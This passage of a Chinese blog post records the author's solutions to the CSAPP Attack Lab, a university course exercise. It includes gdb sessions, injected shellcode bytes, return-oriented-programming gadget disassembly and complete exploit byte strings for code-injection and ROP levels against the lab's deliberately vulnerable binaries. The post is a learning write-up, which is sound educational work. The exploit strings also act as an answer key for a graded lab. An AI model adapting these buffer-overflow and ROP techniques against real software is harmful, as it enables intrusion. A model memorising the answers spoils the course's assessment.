+Breakpoint 1 at 0x40196c: file visible.c, line 92.
+(gdb) run -q
+Starting program: /home/lincx/c++/CSAPP-Labs-master/labs/source/labfile/target1/ctarget -q
+Cookie: 0x59b997fa
+
+Breakpoint 1, test () at visible.c:92
+92      visible.c: No such file or directory.
+(gdb) print /x $rsp
+$1 = 0x5561dca8
+</code></pre>
+<p>所以我们可以：</p>
+<ol>
+<li>将<code>cookie</code>的值转为16进制</li>
+<li>然后写到<code>test</code>栈帧中，再将地址传到<code>%rdi</code></li>
+<li>将<code>touch3</code>地址压栈，同level 2</li>
+</ol>
+<p><img src="https://gitee.com/lincx_py/imagebed/raw/master/images/image-20211208174944524.png" alt="image-20211208174944524"></p>
+<p>首先，编写汇编代码：</p>
+<pre><code class="language-ABAP">mov $0x5561dca8,%rdi
+pushq $0x4018fa
+ret
+</code></pre>
+<p>编译，查看指令：</p>
+<pre><code class="language-shell">$ gcc -c ctarget3.s
+$ objdump -d ctarget3.o &gt; ctarget3insert.asm
+$ cat ctarget3insert.asm
+
+ctarget3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+   7:   68 fa 18 40 00          pushq  $0x4018fa
+   c:   c3                      retq
+</code></pre>
+<p>查看<code>man ascii</code>将cookie <code>59b997fa</code> 转换为16进制：<code>35 39 62 39 39 37 66 61</code></p>
+<p>输入文件：</p>
+<pre><code>48 c7 c7 a8 dc 61 55 68 fa 18
+40 00 c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 35 39
+62 39 39 37 66 61
+</code></pre>
+<p>执行命令，查看结果</p>
+<pre><code class="language-shell">$ ./hex2raw -i ctarget.l3.txt | ./ctarget -q
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
+</code></pre>
+<h3 id="part-ii-return-oriented-programming">Part II: Return-Oriented Programming</h3>
+<p>在ROP攻击中设置了栈随机化，所以我们不能像前面三个一样定位到精确地址插入代码。为了实现攻击，我们要在已经给定的代码中找到特定的指令序列，这些序列以ret结尾，我们把这些命令叫做gadget.</p>
+<p><img src="https://gitee.com/lincx_py/imagebed/raw/master/images/image-20211208180538719.png" alt="image-20211208180538719"></p>
+<h4 id="level-2-1">level 2</h4>
+<p>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).</p>
+<p><strong>Some Advice:</strong></p>
+<ul>
+<li>All the gadgets you need can be found in the region of the code for rtarget demarcated by the functions start_farm and mid_farm.</li>
+<li>You can do this attack with just two gadgets.</li>
+<li>When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.</li>
+</ul>
+<p>这个跟上面的<code>ctarget</code>level 2要求差不多，都是调用<code>touch2</code>，只不过这里要求在<code>rtarget</code>。根据第一点提示，所有用到的 <code>gadgets</code>在<code>start_farm</code>与<code>mid_farm</code>之间找。所以先将<code>farm.c</code>转换成指令</p>
+<pre><code class="language-shell">$ gcc -c -Og farm.c #这里 不加-Og 会采用 stack frame pointer，而rtarget没有用该指针
+$ objdump -d farm.o &gt; farm.asm
+$ cat farm.asm
+
+0000000000000000 &lt;start_farm&gt;:
+   0:   f3 0f 1e fa             endbr64
+   4:   b8 01 00 00 00          mov    $0x1,%eax
+   9:   c3                      retq
+
+000000000000000a &lt;getval_142&gt;:
+   a:   f3 0f 1e fa             endbr64
+   e:   b8 fb 78 90 90          mov    $0x909078fb,%eax
+  13:   c3                      retq
+
+0000000000000014 &lt;addval_273&gt;:
+  14:   f3 0f 1e fa             endbr64
+  18:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
+  1e:   c3                      retq
+
+000000000000001f &lt;addval_219&gt;:
+  1f:   f3 0f 1e fa             endbr64
+  23:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
+  29:   c3                      retq
+
+000000000000002a &lt;setval_237&gt;:
+  2a:   f3 0f 1e fa             endbr64
+  2e:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)
+  34:   c3                      retq
+
+0000000000000035 &lt;setval_424&gt;:
+  35:   f3 0f 1e fa             endbr64
+  39:   c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)
+  3f:   c3                      retq
+
+0000000000000040 &lt;setval_470&gt;:
+  40:   f3 0f 1e fa             endbr64
+  44:   c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)
+  4a:   c3                      retq
+
+000000000000004b &lt;setval_426&gt;:
+  4b:   f3 0f 1e fa             endbr64
+  4f:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
+  55:   c3                      retq
+
+0000000000000056 &lt;getval_280&gt;:
+  56:   f3 0f 1e fa             endbr64
+  5a:   b8 29 58 90 c3          mov    $0xc3905829,%eax
+  5f:   c3                      retq
+  
+  0000000000000056 &lt;getval_280&gt;:
+  56:   f3 0f 1e fa             endbr64
+  5a:   b8 29 58 90 c3          mov    $0xc3905829,%eax
+  5f:   c3                      retq
+
+0000000000000060 &lt;mid_farm&gt;:
+  60:   f3 0f 1e fa             endbr64
+  64:   b8 01 00 00 00          mov    $0x1,%eax
+  69:   c3                      retq
+</code></pre>
+<p>根据提示，只需要其中的两个，而我们大致的思路可以将cookie放到%rdi，把touch2的地址放到栈中，以ret执行。那么需要一个<code>mov</code> 跟<code> popq</code>指令。</p>
+<p>pop会把栈顶的cookie弹出到另外一个寄存器，再用<code>mov</code>命令写到<code>%rdi</code>里。</p>
+<p>下面是<code>mov</code>和<code>pop</code>的字节编码表：</p>
+<p><img src="https://gitee.com/lincx_py/imagebed/raw/master/images/image-20211208183013325.png" alt="image-20211208183013325"></p>
+<p><img src="https://gitee.com/lincx_py/imagebed/raw/master/images/image-20211208183027370.png" alt="image-20211208183027370"></p>
+<p>我们想要的代码：</p>
+<pre><code class="language-ABAP">popq %rax #将栈顶8个字节内存储的值赋值给rax寄存器，并将栈顶指针向上移动八个字节
+movq %rax,%rdi
+</code></pre>
+<p>在上表找 <code>popq %rax</code>对应的指令是 <code>58</code>，<code>movq %rax,%rdi</code>对应的指令是 <code>48 89 c7</code>。因为<code>farm.c</code>里边的函数已经整合进<code>rtarget</code>了，所以回到<code>rtarget.asm</code>中找，找到这两个：</p>
+<pre><code class="language-ABAP">00000000004019a0 &lt;addval_273&gt;:
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+  4019a6:	c3                   	retq   
+
+00000000004019a7 &lt;addval_219&gt;:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+</code></pre>
+<p>由上面的代码中可以看到，<code>pop</code>开始的地址为<code>4019ab</code>，<code>mov</code>开始的地址为<code>4019a2</code></p>
+<p><img src="https://gitee.com/lincx_py/imagebed/raw/master/images/image-20211209092022105.png" alt="image-20211209092022105"></p>
+<p>查看<code>touch2</code>地址为</p>
+<pre><code>0x4017ec
+</code></pre>
+<p>所以我们输入的内容到<code>rtarget.l2.txt</code>为:</p>
+<pre><code>00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 fa 97
+b9 59 00 00 00 00 a2 19 40 00
+00 00 00 00 ec 17 40 00 00 00
+00 00
+</code></pre>
+<p>结果：</p>
+<pre><code class="language-shell">$ ./hex2raw -i rtarget.l2.txt | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
+</code></pre>
+<h4 id="level-3-1">level 3</h4>
+<p>Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p>
+<p>To solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions start_farm and end_farm. In addition to the gadgets used in Phase 4, this expanded farm includes the encodings of different movl instructions, as shown in Figure 3C. The byte sequences in this part of the farm also contain 2-byte instructions that serve as functional nops, i.e., they do not change any register or memory values. These include instructions, shown in Figure 3D, such as andb %al,%al, that operate on the low-order bytes of some of the registers but do not change their values.</p>
+<p><strong>Some Advice:</strong></p>
+<ul>
+<li>You’ll want to review the effect a movl instruction has on the upper 4 bytes of a register, as is described on page 183 of the text.</li>
+<li>The official solution requires eight gadgets (not all of which are unique).</li>
+</ul>
+<p>这里我们需要做的就是将字符串的起始地址，传送到 <code>%rdi</code>然后调用<code>touch3</code>函数。但是因为每次栈的位置都是随机的，无法直接用地址来找到字符串的位置，所以我们只能通过栈顶+偏移量来代替原来的方案。从<code>farm</code>中找不到<code>add</code>相关的指令，但是找到了<code>lea    (%rdi,%rsi,1),%rax</code>代替 <code>add</code></p>
+<p>具体操作：</p>
+<ol>
+<li>将栈顶地址 %rsp 赋值给 %rdi</li>
+<li>将偏移量bias 赋值给 %rsi</li>
+<li>将<code>栈顶+偏移量</code>放到%rdi</li>
+<li>调用touch3</li>
+</ol>
+<p><img src="https://gitee.com/lincx_py/imagebed/raw/master/images/image-20211209095756418.png" alt="image-20211209095756418"></p>
+<p>这里的偏移量是，返回地址与字符串首地址之间有9条指令，每个指令8个byte，一共72字节，72=0x48。</p>
+<p>这里不能直接 <code>mov %rax %rsi</code>，因为farm中没有这条指令。</p>
+<p>分别找到这些指令的起始地址:</p>
+<pre><code>00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 
+a2 19 40 00 00 00 00 00 
+cc 19 40 00 00 00 00 00 
+48 00 00 00 00 00 00 00 
+dd 19 40 00 00 00 00 00 
+70 1a 40 00 00 00 00 00 
+13 1a 40 00 00 00 00 00 
+d6 19 40 00 00 00 00 00 
+a2 19 40 00 00 00 00 00 
+fa 18 40 00 00 00 00 00 
+35 39 62 39 39 37 66 61 00
+</code></pre>
+<p>输出到<code>rtarget.l3.txt</code>，执行查看结果</p>
+<pre><code class="language-shell">$ ./hex2raw -i rtarget.l3.txt | ./rtarget -q
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
+</code></pre>
+<p>成功！</p>
+<h2 id="总结">总结</h2>
+<p>这次实验对gdb等工具的使用有了更进一步的了解，除此之外对，这种缓冲区溢出带来的漏洞认识更深了，最深刻的就是对栈上面的内容排布等很熟悉了。</p>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接: </strong>
+      <a href="https://www.stana.top/2021/12/attack_lab/" title="CSAPP--Attack Lab实验记录" target="_blank" rel="external">https://www.stana.top/2021/12/attack_lab/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License: </strong>
+        <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/lincx-911" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://www.stana.top/images/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/lincx-911" target="_blank"><span class="text-dark">lincx</span><small class="ml-1x">developer</small></a></h3>
+        <div>预防掉发，多敲代码</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+<section id="comments">
+    <div id="vcomments"></div>
+</section>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://www.stana.top/2021/12/bomb_lab/" title="CSAPP--Bomb Lab实验记录"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;下一篇</span></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="文章目录" role="button">
+                    <span>[&nbsp;</span><span>文章目录</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter"
+                data-mobile-sites="weibo,qq,qzone,wechat"></div>
+        </div>
+    </div>
+</nav>
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/lincx-911" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://www.stana.top/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+    <li><a href="https://twitter.com/" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-twitter"></i></a></li>
+</ul>
+  
+  <div class="copyright">
+    &copy;2020  -
+    2021
+    <div class="publishby">
+        Theme by <a href="https://github.com/lincx-911" target="_blank"> lincx </a>base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    </div>
+    
+      <div>
+        <a href="https://beian.miit.gov.cn/" target="_blank">粤ICP备2020130626号-1</a>
+      </div>
+    
+    
+  </div>
+  
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://www.stana.top/js/application.min.a94ab19cb63a95c8d7fbd7b85cab3ddeea8c369bdf75b9cab6708787ead123af.js"></script>
+<script src="https://www.stana.top/js/plugin.min.19c5bcb2fb0789ab4f2b7834e5ceb5e92635645605bab902c1024b25f1502364.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(未命名)',
+            },
+            ROOT_URL: 'https:\/\/www.stana.top\/',
+            CONTENT_URL: 'https:\/\/www.stana.top\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://www.stana.top/js/insight.min.4a2d52de4bfff73e0c688404fe3d17c9a3ae12d9888e1e1ac9c690e4890de2ded50fe55f2b819c2ba55435a76f396f3ea6805765f0b0af5635cdf74ea459eab0.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+<script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine"></script>
+<script type="text/javascript">
+    var GUEST = ['nick', 'mail', 'link'];
+    var meta = 'nick,mail';
+    meta = meta.split(',').filter(function (item) {
+        return GUEST.indexOf(item) > -1;
+    });
+    new Valine({
+        el: '#vcomments',
+        verify: null ,
+        notify: null ,
+        appId: 'ocMp8WMQiBMKT83NJXmMrHR2-gzGzoHsz',
+        appKey: '1rmhmMQvdUG0trgmzmTWYGea',
+        placeholder: 'enjoy~',
+        avatar: 'wavatar',
+        meta: meta,
+        pageSize: '10' || 10,
+        visitor: true 
+});
+</script>
+
+  </body>
+</html>
